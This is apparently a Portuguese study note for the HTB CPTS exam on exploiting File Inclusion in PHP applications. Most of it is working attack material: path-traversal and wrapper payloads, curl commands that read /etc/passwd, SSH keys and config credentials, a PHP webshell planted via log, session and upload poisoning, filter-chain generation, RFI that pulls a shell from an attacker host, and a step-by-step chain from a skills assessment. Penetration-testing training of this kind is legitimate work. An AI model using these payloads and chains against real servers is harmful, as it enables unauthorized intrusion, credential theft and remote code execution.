---
tema: Web / Inclusão de arquivo
tópico: File Inclusion — LFI, RFI, wrappers PHP e LFI→RCE
tags: [htb, cpts, lfi, rfi, wrappers, web, rce]
dificuldade: medium
---

# 📂 CPTS 20 — File Inclusion

> [!info] Objetivo
> Explorar parâmetros que incluem arquivos (`?page=`, `?file=`, `?lang=`, `?view=`, `?template=`) para ler arquivos locais (LFI), incluir código remoto (RFI) e **transformar LFI em execução de código** via log poisoning, sessões PHP, wrappers ou filter chain.

---

## 🎯 Quando usar

| Sinal no alvo | Caminho provável |
|---------------|------------------|
| `index.php?page=about`, `?lang=pt`, `?view=home` | LFI direto |
| `include()`/`require()` com variável | LFI (código PHP incluído, não só lido) |
| Parâmetro aceita URL completa | RFI (se `allow_url_include=On`) |
| Página retorna conteúdo de arquivo mesmo sem exibir | LFI com `php://filter` para ler o fonte |
| App escreve dados em sessão e exibe em outra página | Session poisoning → RCE |
| Web server com log acessível | Log poisoning → RCE |

---

## 🧰 Ferramentas

| Ferramenta | Uso |
|-----------|-----|
| Burp Repeater | Testar traversal, wrappers e poison passo a passo |
| `ffuf` | Fuzz com wordlists de LFI e filtro por tamanho |
| `curl` | Testes rápidos, inclusive com `--path-as-is` |
| `python3 -m http.server` | Servir payload para RFI |
| `tp-lfi` / LFI Suite | Automação (opcional) |
| `php_filter_chain_generator.py` | Filter chain de LFI→RCE |
| SecLists | Wordlists de paths e wrappers |

---

## 🔎 Detecção e traversal básico

```bash
# Teste absoluto (mais comum de funcionar)
curl -s "http://<IP>/index.php?page=/etc/passwd"
curl -s "http://<IP>/index.php?page=/etc/passwd%00"        # null byte (PHP < 5.3.4)
```

```bash
# Profundidade: subir diretórios até acertar
curl -s "http://<IP>/index.php?page=../../../../../../etc/passwd"
for i in $(seq 1 10); do
  path=$(printf '../%.0s' $(seq 1 $i))
  echo "== $path"
  curl -s "http://<IP>/index.php?page=${path}etc/passwd" | grep -m1 'root:'
done
```

| Payload | Serve para |
|---------|-----------|
| `/etc/passwd` | Confirmar leitura absoluta |
| `../../../../etc/passwd` | Traversal relativo |
| `....//....//etc/passwd` | Filtro que remove `../` uma vez |
| `..%2f..%2fetc%2fpasswd` | Filtro que bloqueia a string literal |
| `%2e%2e%2f%2e%2e%2fetc%2fpasswd` | Filtro que decodifica depois |
| `%252e%252e%252fetc%252fpasswd` | Decodificação dupla |
| `..\..\..\..\windows\win.ini` | Alvo Windows |
| `C:/windows/win.ini` / `/windows/win.ini` | Windows com barra normal |
| `/etc/passwd/.` ou `/etc/passwd/` | Sufixo indesejado (`/.php`) sendo anexado |
| `php://filter/...` | Ler o código-fonte em vez de executar |

```bash
# Fuzzing de caminhos (filtra pelo tamanho da resposta de erro, medido antes)
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "http://<IP>/index.php?page=FUZZ" -fs 0 -ac -c

# Wordlists úteis (SecLists)
# Fuzzing/LFI/LFI-Jhaddix.txt
# Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt
# Fuzzing/LFI/Linux/LFI-gracefulsecurity-linux.txt
# Fuzzing/LFI/Linux/LFI-etc-files-of-all-linux-packages.txt
# Fuzzing/LFI/Windows/Windows-Paths.txt
```

---

## 📜 Arquivos que valem a leitura

### Linux

| Path | O que entrega |
|------|---------------|
| `/etc/passwd` | Usuários, shells, home |
| `/etc/shadow` | Hashes (só como root) |
| `/etc/hosts`, `/etc/resolv.conf` | Rede interna e domínios |
| `/proc/self/cmdline`, `/proc/self/environ`, `/proc/self/cwd` | Contexto do processo web |
| `/proc/net/tcp`, `/proc/net/fib_trie` | Conexões e rotas internas |
| `/var/log/apache2/access.log`, `/var/log/nginx/access.log` | Log poisoning |
| `/var/log/auth.log`, `/var/log/vsftpd.log`, `/var/log/mail.log` | Poisoning por SSH/FTP/mail |
| `/var/lib/php/sessions/sess_<ID>` | Sessão PHP (poisoning) |
| `/home/<USUARIO>/.ssh/id_rsa`, `/root/.ssh/id_rsa` | Chave privada |
| `/home/<USUARIO>/.bash_history` | Histórico (senhas, comandos) |
| `/var/www/html/config.php`, `wp-config.php` | Credenciais de banco |
| `/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf`, `/etc/php/*/apache2/php.ini` | Config e `open_basedir` |
| `/etc/crontab`, `/var/spool/cron/crontabs/<USER>` | Tarefas agendadas |

### Windows

| Path | O que entrega |
|------|---------------|
| `C:\Windows\win.ini` | Teste clássico de LFI em Windows |
| `C:\Windows\System32\drivers\etc\hosts` | Rede interna |
| `C:\Windows\repair\sam`, `\config\SAM` | Hashes SAM |
| `C:\inetpub\wwwroot\web.config` | Credenciais/connection strings |
| `C:\xampp\apache\logs\access.log` | Log poisoning no XAMPP |
| `C:\Windows\System32\inetsrv\config\applicationHost.config` | Config do IIS |
| `C:\Users\<USUARIO>\.ssh\id_rsa` | Chave privada |

---

## 🧪 Wrappers PHP

| Wrapper | Uso | Requisito |
|---------|-----|-----------|
| `php://filter` | Ler/transformar o conteúdo do recurso | Sempre disponível |
| `php://input` | Incluir o corpo da requisição POST | `allow_url_include=On` |
| `data://` | Incluir dados inline (base64) | `allow_url_include=On` |
| `expect://` | Executar comando direto | Extensão `expect` instalada (raro) |
| `zip://` | Executar PHP dentro de um ZIP | Qualquer arquivo PHP enviado |
| `phar://` | Igual ao zip, formato phar | Upload de arquivo |
| `compress.zlib://`, `compress.bzip2://` | Descomprimir e incluir | zlib/bzip2 |
| `file://` | Ler/exibir arquivo local | `allow_url_fopen` |

```text
# php://filter — ler o CÓDIGO FONTE em vez de executar
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php
→ decodificar:  echo 'BASE64' | base64 -d
```

```bash
# php://input — o corpo do POST vira o conteúdo incluído
curl -s "http://<IP>/index.php?page=php://input" \
  -d '<?php system($_GET["c"]);?>' --data-urlencode
# Depois: /index.php?page=php://input&c=id  (repetindo o corpo a cada request)

# data:// — payload inline, sem request extra
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
#    ↑ base64 de: <?php system($_GET['c']);?>
# Variante sem base64 (menos confiável por causa da codificação na URL):
?page=data://text/plain,<?php system($_GET['c']);?>

# expect:// — quando a extensão existir
?page=expect://id
```

```bash
# zip:// e phar:// — precisam de um arquivo que você enviou
# 1) empacote o payload preservando o nome interno
echo '<?php system($_GET["c"]);?>' > shell.php
zip payload.zip shell.php
# 2) envie payload.zip como "imagem"/anexo e inclua o membro com o # (%23)
?page=zip://uploads/payload.zip%23shell.php
?page=phar://uploads/payload.zip/shell.php
```

```bash
# compress.zlib:// — inclui um recurso comprimido
?page=compress.zlib://uploads/payload.gz
```

> [!tip] php://filter é o primeiro teste
> Ele resolve dois problemas de uma vez: lê fonte (credenciais em `config.php`) e não depende do arquivo executar. `resource=` aponta para o arquivo; `read=`/`convert.base64-encode` evitam que o PHP execute o conteúdo como código.

---

## 🔗 php filter chain (LFI → RCE sem upload)

Técnica do Synacktiv: encadear filtros `convert.iconv.*` para **construir** texto arbitrário (uma webshell) a partir de um arquivo qualquer.

```bash
# Gerador
git clone https://github.com/synacktiv/php_filter_chain_generator.git
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
# Saída: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
#        convert.iconv.UTF8.UTF7|...|convert.base64-decode|...  (longa)
```

```bash
# Usar a chain gerada exatamente como veio, e passar o comando depois
curl -s "http://<IP>/index.php?page=<CHAIN>&c=id"
```

> [!warning] Payload gigante
> A chain tem alguns milhares de caracteres e quebra o limite de URL em alguns servidores. Use Burp com `--path-as-is` ou envie direto na query sem passar pelo curl. Funciona quando os filtros `iconv` do PHP estão disponíveis (o padrão na maioria das builds).

---

## ☠️ Log poisoning

O alvo: incluir um log onde **você conseguiu escrever** código PHP.

| Serviço | Log | Como injetar |
|---------|-----|--------------|
| Apache | `/var/log/apache2/access.log` | User-Agent ou path da URL |
| Apache (erro) | `/var/log/apache2/error.log` | URL malformada |
| Nginx | `/var/log/nginx/access.log` | User-Agent |
| SSH | `/var/log/auth.log` | Nome de usuário inválido |
| FTP (vsftpd) | `/var/log/vsftpd.log` | Nome de usuário |
| Mail | `/var/log/mail.log` | Assunto/campos do e-mail |
| XAMPP (Windows) | `C:\xampp\apache\logs\access.log` | User-Agent |

```bash
# 1) Escrever o payload no log (User-Agent é o mais confiável: não é URL-encoded)
curl -s -A '<?php system($_GET["c"]);?>' "http://<IP>/"

# 2) Incluir o log e passar o comando
curl -s "http://<IP>/index.php?page=/var/log/apache2/access.log&c=id"
```

```bash
# 3) SSH: o username inválido é registrado em auth.log
ssh '<?php system($_GET["c"]);?>'@<IP>
# Procurar o log e incluir
curl -s "http://<IP>/index.php?page=/var/log/auth.log&c=id"

# 4) FTP: usuário vira entrada no log do daemon
ftp <IP>            # usuário: <?php system($_GET["c"]);?>
curl -s "http://<IP>/index.php?page=/var/log/vsftpd.log&c=id"
```

> [!note] sanitização
> Alguns daemons escapam o nome de usuário no log (`\x3c` no lugar de `<`). Se auth.log não funcionar, confirme o formato lendo o arquivo via LFI (`?page=/var/log/auth.log`) antes de culpar a técnica.

---

## 🖥️ `/proc/self/environ` e descritores

```bash
# Se o ambiente do processo web é legível, o User-Agent pode virar conteúdo incluído
curl -s "http://<IP>/" -A '<?php system($_GET["c"]);?>'
curl -s "http://<IP>/index.php?page=/proc/self/environ&c=id"

# FDs abertos pelo Apache/nginx (fonte do conteúdo da resposta anterior)
# ?page=/proc/self/fd/0 ... /proc/self/fd/20 (varra os números)
```

| Limitação | Detalhe |
|-----------|---------|
| `mod_php` | O `environ` pode vir do processo pai do Apache, não do request atual |
| Permissão | Precisa ser legível pelo usuário do servidor web |
| PHP-FPM | Com origem diferente, `/proc/self/environ` reflete o FPM, não o request |

---

## 🗂️ Sessões PHP

### Poison via sessão normal

```bash
# 1) Descobrir o ID da sessão (cookie) e achar o caminho dos arquivos
curl -sI "http://<IP>/" | grep -i set-cookie        # PHPSESSID=abc123
# paths comuns: /var/lib/php/sessions/sess_abc123, /tmp/sess_abc123

# 2) Gravar o payload em algum campo que a app salva na sessão
curl -s "http://<IP>/profile.php" -b "PHPSESSID=abc123" \
  --data-urlencode 'name=<?php system($_GET["c"]);?>'

# 3) Incluir o arquivo de sessão
curl -s "http://<IP>/index.php?page=/var/lib/php/sessions/sess_abc123&c=id"
```

> [!tip] Encoding obrigatório
> A sessão PHP usa serialização: `|` e aspas têm significado. Passe o payload URL-encoded ou escreva versões sem caracteres especiais (`<?=system($_GET[c]);?>`).

### Poison via `PHP_SESSION_UPLOAD_PROGRESS` (race)

```text
Requisitos: session.auto_start=On (ou $_SESSION tocada), session.upload_progress.enabled=On,
session.upload_progress.cleanup=Off e uma thread capaz de correr com a limpeza.

Fluxo:
  1. POST multipart com campo PHP_SESSION_UPLOAD_PROGRESS contendo o payload
     → o arquivo /tmp/sess_<PHP_SESSID> passa a conter o texto do campo.
  2. Enquanto o upload está em andamento, inclua o arquivo de sessão via LFI.
  3. O PHP inclui o conteúdo → executa seu código.

Automação conhecida: lfi-session-upload-progress / session_upload_progress scripts
(uma thread envia o multipart gigante, outra martela o include do sess_ file).
```

---

## 🌐 RFI → shell

```bash
# Servir o payload no atacante
mkdir -p /tmp/www && cd /tmp/www
echo '<?php system($_GET["c"]);?>' > shell.php
python3 -m http.server 80
```

```bash
# Incluir a URL remota (exige allow_url_include=On no php.ini)
curl -s "http://<IP>/index.php?page=http://<IP_ATACANTE>/shell.php&c=id"

# Truque do sufixo: se a app acrescenta ".php", aponte para o nome sem extensão
?page=http://<IP_ATACANTE>/shell      # o servidor pede shell.php

# HTTPS e outros esquemas, quando o alvo aceitar
?page=https://<IP_ATACANTE>/shell.php
?page=ftp://<USUARIO>:<SENHA>@<IP_ATACANTE>/shell.php
?page=\\<IP_ATACANTE>\share\shell.php      # SMB, alvos Windows com allow_url_include
```

| Requisito | Como confirmar |
|-----------|----------------|
| `allow_url_include=On` | LFI em `/etc/php/*/apache2/php.ini` ou envio de payload e erro |
| `allow_url_fopen=On` | Necessário para alguns wrappers (`allow_url_include` já implica) |
| Saída HTTP do atacante visível | `python3 -m http.server` mostra a requisição chegando |

> [!danger] RFI em ambiente restrito
> RFI é o vetor mais barulhento: gera requisição de fora para dentro e é quase sempre bloqueado (egress filtering + `allow_url_include=Off`, que é o default moderno). Só insista após confirmar a config.

---

## 🧰 LFI → RCE: resumo de caminhos

| Caminho | Precisa de | Barulho |
|---------|-----------|---------|
| Log poisoning (Apache/SSH/FTP) | Log legível + escrita nele | Alto |
| Sessão PHP | Payload gravado na sessão | Médio |
| `PHP_SESSION_UPLOAD_PROGRESS` | `session.upload_progress` habilitado + race | Médio |
| `php://input` / `data://` / `expect://` | `allow_url_include=On` | Baixo |
| `zip://` / `phar://` | Upload de arquivo permitido | Médio |
| php filter chain | Filtros `iconv` disponíveis | Baixo |
| RFI | `allow_url_include=On` + egress | Alto |
| `pearcmd.php` | LFI sem sufixo + querystring injetável + PEAR instalado | Baixo |

```text
# pearcmd.php (quando o include recebe a querystring): usar config-create para
# gravar um arquivo com a webshell e depois incluí-lo normalmente.
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>+/tmp/shell.php
# depois:  ?file=/tmp/shell.php   → POST 1=system('id');
```

---

## ⚠️ Pegadinhas

- Sufixo anexado pela app (`$page . '.php'`): resolva com null byte (PHP antigo), `/` final no path, path truncation (4096 chars com `/.`) ou escolhendo um arquivo que exista com o sufixo.
- `php://filter` **não executa** — é leitura. Se você precisa de execução, use outro wrapper/poisoning.
- O bloqueio de paths não vem da versão do PHP, e sim de `open_basedir` e `disable_functions`: leia o `php.ini` antes de montar o ataque.
- `open_basedir` limita o include a um diretório: LFI vira inútil fora dele (teste `/etc/passwd` para confirmar).
- `disable_functions` pode matar `system`, `exec`, `shell_exec` — teste `php`-level: `<?php print_r(scandir('/'));?>`.
- Null byte só funciona em PHP < 5.3.4 — em versões novas sempre dá `No such file`.
- `/proc/self/environ` raramente é controlável em `mod_php`; teste antes de perder tempo.
- Log poisoning exige que o log seja **legível pelo usuário do servidor web** — teste com `curl` direto no path.
- Se a app usa `include_once`/`require` com cache (opcache), o arquivo alterado pode não refletir; reinicie o contexto (novo path).
- RFI não funciona se `allow_url_include=Off` — default em PHP moderno.
- Ler `config.php` via `php://filter` (base64) é o caminho para credenciais; sem base64 o PHP executa o arquivo e você vê página em branco.

---

## 🧩 Playbook: LFI-read + upload previsível + include escondido → RCE

> [!example] Caso real — Skills Assessment "Sumace" (File Inclusion)
> Site de vagas com upload de currículo (`apply.php`→`api/application.php`), imagens servidas por `api/image.php?p=<md5>`, e `/uploads/` + `/regions/` com `deny all` no nginx. A RCE sai de **três peças separadas** encadeadas — nenhuma delas isolada resolve.

### Mentalidade

> [!tip] A pergunta central
> Quando o alvo **não executa** o que você sobe (diretório com `deny all` / sem interpretador), separe em dois problemas: **(1) escrever** um arquivo com código no disco e **(2) achar um `include()` que o leia do disco**. O `include` ignora o `deny all` do nginx — isso é só regra de **HTTP**, não de filesystem.

### As três peças

| Peça | Papel | Pegadinha |
|------|-------|-----------|
| `image.php?p=` → `file_get_contents("../images/".str_replace("../","",$p))` | **Leitura** arbitrária (LFI-read). Ler o **código-fonte** de todo o app | `php://` morre pelo **prefixo** `../images/`. `str_replace` só remove `../` **uma vez** → bypass `....//` |
| `application.php` → `"../uploads/".md5_file($tmp)."."$ext` | **Escrita** com nome **previsível** e extensão livre (sem validação) | Nome = `md5(conteúdo)` → calculável localmente. Diretório fixo (`/uploads/`) |
| `contact.php?region=` → `include "./regions/".urldecode($region).".php"` | **Execução** (`include` lê do disco, dribla o `deny all`) | Filtro checa `.`/`/` no input **cru**, mas faz `urldecode` antes → **dupla codificação** (`%252e%252e%252f`) |

### Fluxo

```bash
T="http://ALVO:PORTA"

# 0) LFI-read via image.php (bypass ../ com ....//) — LER O FONTE é o passo que destrava tudo
curl -s "$T/api/image.php?p=....//apply.php"                 # confirma LFI (one-shot ../)
curl -s "$T/api/image.php?p=....//....//....//....//etc/passwd"  # calibra profundidade / open_basedir
curl -s "$T/api/image.php?p=....//api/application.php"       # fonte do handler de upload
curl -s "$T/api/image.php?p=....//contact.php"              # <-- acha o parâmetro escondido 'region'

# 1) webshell (conteúdo controlado → md5 previsível). Pura PHP basta (sem filtro de tipo)
printf '<?php system($_GET["c"]); ?>' > x.php
MD=$(md5sum x.php | cut -d' ' -f1)   # == nome salvo: /uploads/<MD>.php
curl -s -F firstName=x -F lastName=y -F email=a@a.com -F notes=z \
     -F "file=@x.php;filename=x.php" "$T/api/application.php"

# 2) include via contact.php — region CRU na URL (dupla codificação de ../uploads/)
#    include acrescenta ".php" sozinho → referencie SEM a extensão
curl -s "$T/contact.php?region=%252e%252e%252fuploads%252f${MD}&c=id"
curl -s "$T/contact.php?region=%252e%252e%252fuploads%252f${MD}&c=ls%20-la%20/"
curl -s "$T/contact.php?region=%252e%252e%252fuploads%252f${MD}&c=cat%20/flag_xxxx.txt"
```

> [!warning] Pegadinhas que custam horas (todas reais)
> - **`image.php` não é hashmap.** `?p=<md5>` parecer "mapa" é engodo — é `file_get_contents`. Valide lendo `....//apply.php`, não só `/etc/passwd`.
> - **Confirme `include` vs `readfile`** incluindo uma página PHP dinâmica e vendo o **valor refletido** (execução) vs o `<?= ... ?>` **literal** (leitura). Não confie no header `Content-Type`.
> - **`....//` colapsa para `../`** só porque `str_replace("../","",...)` roda **uma vez**. Se fosse recursivo, não funcionaria.
> - **Dupla codificação** porque o PHP já decodifica `$_GET` uma vez: mande `%252e` → filtro vê `%2e` (sem `.`), `urldecode` vira `.`.
> - **NÃO use `curl --data-urlencode` no `region`** — ele recodifica o `%25` e quebra tudo. Ponha `region` **cru** na URL; codifique só o `c`.
> - **Uploads podem ser limpos em segundos.** Faça upload + include **colados** no mesmo script; não intercale requests de debug.
> - **`deny all` (`^~`) no nginx** mata execução por HTTP em `/uploads/`, mas `include`/`file_get_contents` leem do disco numa boa.
> - **Flag world-readable** (`r--r--r--`) às vezes nem precisa de RCE — a LFI-read já pega. Mas tenha a RCE pronta pro resto.

### Generalização para a prova

> [!note] Quando duas primitivas "fracas" viram RCE
> **Escrita arbitrária sem execução** (upload em dir bloqueado, log, sessão, `/tmp`) **+** **qualquer `include` de input controlado** = RCE. Procure o `include` lendo **todo o código-fonte** via a primitiva de leitura antes de desistir. Candidatos de include escondido: `?page=`, `?file=`, `?lang=`, `?view=`, `?template=`, `?region=` — e sempre cheque filtros que decodificam **depois** de validar.

---

## ✅ Checklist rápido

- [ ] Parâmetro de inclusão identificado (`page`, `file`, `lang`, `view`, `template`)
- [ ] LFI confirmado (`/etc/passwd` ou `C:\Windows\win.ini`)
- [ ] Profundidade de traversal calibrada
- [ ] `php://filter` usado para ler o código-fonte de `index.php`/`config.php`
- [ ] Credenciais encontradas em config e reaproveitadas
- [ ] `allow_url_include` / `open_basedir` / `disable_functions` verificados
- [ ] Wrappers testados com base na config real (`php://input`, `data://`, `zip://`)
- [ ] Caminho de RCE escolhido (poisoning, sessão, filter chain, RFI)
- [ ] Log/sessão legível e testado antes do poisoning
- [ ] Shell obtido com evidência (comando, hora, output)
- [ ] Artefatos gravados no servidor removidos/documentados
- [ ] Recomendação registrada: allowlist de arquivos, sem input do usuário em `include`, desabilitar wrappers

---

## 🔗 Relacionado

- [[CPTS 21 - File Upload Attacks]]
- [[CPTS 22 - Command Injections]]
- [[CPTS 23 - Web Attacks]]
- [[CPTS 24 - Attacking Common Applications]]
- [[Fase 06 - Vulnerabilidade e Exploração]]
